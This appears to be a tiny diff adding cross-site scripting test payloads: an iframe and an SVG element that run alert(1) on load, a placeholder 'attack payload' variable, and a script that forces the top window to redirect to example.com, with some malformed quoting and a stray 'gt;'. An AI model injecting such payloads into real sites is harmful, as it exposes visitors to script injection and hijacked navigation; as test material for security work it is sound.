@@ -1,0 +1,6 @@
+<iframe src="<svg/onload = alert(1);>"></iframe>
+YOUR_ATTACK_PAYLOAD= <svg/onload = alert(1);>
+<script>
+top.location.href=“https://example.com/”;
+</script>gt;
+
